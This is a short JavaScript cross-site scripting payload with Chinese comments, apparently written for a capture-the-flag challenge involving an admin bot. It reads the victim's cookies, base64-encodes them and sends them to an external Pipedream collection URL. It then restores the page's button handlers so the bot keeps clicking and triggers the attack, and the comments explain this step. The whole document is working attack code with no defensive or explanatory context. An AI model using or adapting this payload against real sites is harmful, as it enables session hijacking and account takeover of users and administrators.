(async () => {
    // 1. 偷 Cookie (傳送到 Pipedream)
    fetch('https://eos82zp0nc2qmhz.m.pipedream.net/?flag=' + btoa(document.cookie));

    // 2. 還原原本按鈕的功能，確保 Admin 點擊時能跳轉
    // 這樣機器人才會繼續執行後續動作，讓你成功觸發 XSS
    document.querySelectorAll('.view').forEach((e) => {
        e.addEventListener('click', () => {
            window.location = `/comment/${e.id}`;
        });
    });

    // 模擬原本的回覆功能 (可選，但為了保險可以加上)
    document.querySelectorAll('.reply').forEach((e) => {
        e.addEventListener('click', () => {
            console.log('Admin clicked reply');
        });
    });
})();
